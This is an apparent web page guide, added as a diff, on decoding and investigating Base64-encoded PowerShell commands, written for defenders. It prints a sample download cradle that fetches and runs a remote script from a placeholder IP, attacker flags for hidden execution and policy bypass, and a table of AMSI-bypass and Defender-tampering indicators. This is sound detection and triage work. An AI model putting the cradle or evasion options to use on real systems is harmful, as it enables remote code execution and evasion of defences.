@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>How to decode and investigate encoded PowerShell commands | OpsVantage Tools</title>
+<meta name="description" content="Why attackers use powershell -enc, how to decode the Base64 safely (it's UTF-16LE), how to unpack compressed layers, and what to look for once you can read it.">
+<link rel="canonical" href="https://tools.opsvantage.net/guides/decode-encoded-powershell/">
+<meta name="theme-color" content="#0A0D18">
+<link rel="icon" type="image/png" href="../../assets/logo.png">
+<meta property="og:type" content="article">
+<meta property="og:title" content="How to decode and investigate encoded PowerShell commands">
+<meta property="og:description" content="Why attackers use powershell -enc, how to decode the Base64 safely (it's UTF-16LE), how to unpack compressed layers, and what to look for once you can read it.">
+<meta property="og:url" content="https://tools.opsvantage.net/guides/decode-encoded-powershell/">
+<script src="../../assets/theme.js"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/hub.css">
+<script type="application/ld+json">
+[
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "How to decode and investigate encoded PowerShell commands",
+    "description": "Why attackers use powershell -enc, how to decode the Base64 safely (it's UTF-16LE), how to unpack compressed layers, and what to look for once you can read it.",
+    "url": "https://tools.opsvantage.net/guides/decode-encoded-powershell/",
+    "datePublished": "2026-11-04",
+    "dateModified": "2026-11-04",
+    "inLanguage": "en",
+    "author": {
+      "@type": "Organization",
+      "name": "OpsVantage",
+      "url": "https://opsvantage.net/"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "OpsVantage",
+      "url": "https://opsvantage.net/"
+    }
+  },
+  {
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+      {
+        "@type": "Question",
+        "name": "Is every encoded PowerShell command malicious?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "No. Ansible, some RMM and deployment tools, and a few vendor agents use -EncodedCommand to avoid quoting problems. Decode it, check the parent process, and add known-good tools to an allow list instead of ignoring the pattern."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Why does my decoded text have dots between every letter?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "You decoded UTF-16LE as UTF-8 or ASCII. Use [Text.Encoding]::Unicode in PowerShell or utf-16-le in Python."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "How do I detect encoded PowerShell automatically?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Turn on command-line logging for Event ID 4688 or deploy Sysmon, enable script block logging (4104), and alert on powershell with -e, -en or -enc followed by a long Base64 string, especially from Office or browser parents."
+        }
+      }
+    ]
+  }
+]
+</script>
+</head>
+<body>
+<header class="nav">
+  <div class="wrap nav-inner">
+    <a class="brand" href="../../"><img src="../../assets/logo.png" alt="" width="28" height="28"><span>Ops<b>Vantage</b> Tools</span></a>
+    <div class="nav-right">
+      <a class="link opt" href="../../#tools">Tools</a>
+      <a class="link opt" href="../../guides/">Guides</a>
+      <a class="link opt" href="../../events/">Event IDs</a>
+      <a class="link wide" href="https://opsvantage.net/">opsvantage.net</a>
+      <button class="theme-toggle" type="button" aria-label="Toggle light or dark theme">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap">
+  <article class="article">
+    <div class="tool-head">
+      <div class="crumbs"><a href="../../">Tools</a> / <a href="../">Guides</a> / Decode encoded PowerShell</div>
+      <h1>How to decode <em>encoded PowerShell</em> commands</h1>
+      <p class="lead">Why attackers use powershell -enc, how to decode the Base64 safely (it's UTF-16LE), how to unpack compressed layers, and what to look for once you can read it.</p>
+      <div class="meta-line">Updated 2026-11-04 · 8 min read</div>
+    </div>
+<p>You find a process creation event with a command line like <code>powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...</code> and a few hundred more characters of what looks like noise. That noise is the actual script, Base64-encoded. Attackers use <strong>encoded PowerShell</strong> because it hides the script from a quick glance, survives being passed through other tools without quoting problems, and slips past simple keyword alerts. Decoding it takes a minute once you know the one detail that trips most people up.</p>
+
+<h2>Spot the encoded command</h2>
+<p>PowerShell accepts any unambiguous abbreviation of <code>-EncodedCommand</code>, so you'll see all of these:</p>
+<pre><code>-EncodedCommand   -enc   -en   -e   -ec</code></pre>
+<p>They usually travel with other options that keep the window out of sight and skip the user's profile and execution policy: <code>-nop</code> (NoProfile), <code>-w hidden</code> (WindowStyle Hidden), <code>-ep bypass</code> (ExecutionPolicy Bypass) and <code>-noni</code> (NonInteractive). None of them is malicious alone. Together with <code>-enc</code>, from Office or a browser as the parent process, they're a very strong signal.</p>
+<p>You'll find them in Security Event ID 4688 (if command-line auditing is on), in <a href="../../events/sysmon-1/">Sysmon Event ID 1</a>, in services (<a href="../../events/system-7045/">Event ID 7045</a>), scheduled tasks and Run keys.</p>
+
+<h2>Decode it: the UTF-16LE detail</h2>
+<p><code>-EncodedCommand</code> expects Base64 of the script <em>in UTF-16LE</em>, not UTF-8. Decode it as UTF-8 and you get text with a dot or blank between every letter, which is the giveaway. Decoding is just text conversion; it doesn't run anything, so it's safe to do on an analyst machine.</p>
+<p><strong>PowerShell:</strong></p>
+<pre><code>$b64 = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBhAC4AcABzADEAJwApAA=='
+[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))</code></pre>
+<p>That prints:</p>
+<pre><code>IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a.ps1')</code></pre>
+<p>A download cradle: fetch a script from that address and run it in memory.</p>
+<p><strong>Python:</strong></p>
+<pre><code>import base64
+print(base64.b64decode(b64).decode('utf-16-le'))</code></pre>
+<p><strong>CyberChef:</strong> "From Base64", then "Decode text" with UTF-16LE (1200). Or "Remove null bytes" after From Base64, which works for plain English text.</p>
+<div class="callout"><p><strong>Copy the whole string.</strong> Event viewers and SIEM tables often cut long command lines. If the decoded text stops mid-word, get the full value from the raw event XML.</p></div>
+
+<h2>Peel off the next layer</h2>
+<p>The first decode often reveals another layer. The common ones:</p>
+<ul>
+  <li><strong>More Base64</strong> inside <code>[Convert]::FromBase64String('...')</code>. Decode that string the same way. If it decodes to readable text straight away, it was UTF-8 rather than UTF-16LE.</li>
+  <li><strong>Compression:</strong> <code>IO.Compression.GzipStream</code> or <code>DeflateStream</code> wrapped around a Base64 blob. Decompress it without running the rest:</li>
+</ul>
+<pre><code>$bytes = [Convert]::FromBase64String($inner)
+$ms = New-Object IO.MemoryStream(,$bytes)
+$z  = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)   # or DeflateStream
+(New-Object IO.StreamReader($z)).ReadToEnd()</code></pre>
+<ul>
+  <li><strong>String tricks:</strong> <code>'Down'+'loadString'</code>, <code>-join [char[]](73,69,88)</code>, format strings like <code>"{1}{0}" -f 'X','IE'</code>, and backticks inside names (<code>I`E`X</code>). Rebuild the strings by hand or evaluate only the string expression.</li>
+</ul>
+<p>Whatever you do, <strong>never run the decoded script</strong>, and don't run any line that calls <code>IEX</code>, <code>Invoke-Expression</code> or <code>&amp;</code>. Replace those with <code>Write-Output</code> if you need PowerShell to rebuild a string for you, and do it in a disposable VM.</p>
+<p>If script block logging is on, you may not need any of this: <a href="../../events/powershell-4104/">PowerShell Event ID 4104</a> records the script after PowerShell itself has decoded it.</p>
+
+<h2>What to look for in the decoded script</h2>
+<div class="table-wrap"><table>
+  <tr><th>You see</th><th>It means</th></tr>
+  <tr><td><code>DownloadString</code>, <code>DownloadFile</code>, <code>Invoke-WebRequest</code>, <code>iwr</code>, <code>Net.WebClient</code></td><td>It fetches something. Note every URL, domain and IP.</td></tr>
+  <tr><td><code>IEX</code>, <code>Invoke-Expression</code></td><td>Runs code it just built or downloaded.</td></tr>
+  <tr><td><code>AmsiUtils</code>, <code>amsiInitFailed</code></td><td>AMSI bypass: it's trying to blind antivirus.</td></tr>
+  <tr><td><code>Reflection.Assembly]::Load</code>, <code>VirtualAlloc</code>, <code>GetDelegateForFunctionPointer</code></td><td>Loads code or shellcode straight into memory.</td></tr>
+  <tr><td><code>Set-MpPreference</code>, <code>Add-MpPreference -ExclusionPath</code></td><td>Turning off Defender or adding exclusions.</td></tr>
+  <tr><td><code>New-ScheduledTask</code>, <code>New-Service</code>, Run key paths</td><td>Persistence.</td></tr>
+</table></div>
+
+<h2>Then investigate</h2>
+<ol>
+  <li>Check every URL, domain and IP from the script against threat intelligence.</li>
+  <li>Look at the parent process. Winword, Excel, Outlook, a browser or <code>wmiprvse.exe</code> starting it means phishing or remote execution.</li>
+  <li>Check network logs or <a href="../../events/sysmon-3/">Sysmon Event ID 3</a> for whether the download actually happened.</li>
+  <li>Search for the same encoded string, or its decoded URL, on other hosts. Campaigns reuse them.</li>
+</ol>
+
+<h2>FAQ</h2>
+<h3>Is every encoded PowerShell command malicious?</h3>
+<p>No. Ansible, some RMM and deployment tools, and a few vendor agents use <code>-EncodedCommand</code> to avoid quoting problems. Decode it, check the parent process, and add known-good tools to an allow list instead of ignoring the pattern.</p>
+<h3>Why does my decoded text have dots between every letter?</h3>
+<p>You decoded UTF-16LE as UTF-8 or ASCII. Use <code>[Text.Encoding]::Unicode</code> in PowerShell or <code>utf-16-le</code> in Python.</p>
+<h3>How do I detect encoded PowerShell automatically?</h3>
+<p>Turn on command-line logging for Event ID 4688 or deploy Sysmon, enable script block logging (4104), and alert on <code>powershell</code> with <code>-e</code>, <code>-en</code> or <code>-enc</code> followed by a long Base64 string, especially from Office or browser parents.</p>
+    <div class="next">
+      <div><b>Find encoded commands in your logs</b><p>Windows Event Triage reads exported events in your browser and flags encoded PowerShell, download cradles, AMSI bypasses and other execution patterns.</p></div>
+      <a class="btn btn-primary" href="../../event-triage/">Open Event Triage</a>
+    </div>
+    <div class="next">
+      <div><b>Check what the script downloads</b><p>Once decoded, encoded PowerShell usually points at a URL, domain or IP. IOC Triage, our free browser extension, gives a verdict for each from 15 threat-intel sources with a right-click.</p></div>
+      <a class="btn btn-ghost" href="https://chromewebstore.google.com/detail/dncgneacahomieionjkaofmfnojlkfmc?utm_source=tools.opsvantage.net&amp;utm_medium=guide&amp;utm_campaign=decode-encoded-powershell">Add IOC Triage to Chrome</a>
+    </div>
+  </article>
+</main>
+<footer>
+  <div class="wrap row">
+    <span>© <span id="year">2026</span> OpsVantage. Tools are provided as-is; verify findings before acting on them.</span>
+    <span><a href="../../">All tools</a> · <a href="../../guides/">Guides</a> · <a href="../../privacy/">Privacy &amp; terms</a> · <a href="https://opsvantage.net/">opsvantage.net</a></span>
+  </div>
+</footer>
+<script src="../../assets/hub.js"></script>
+</body>
+</html>
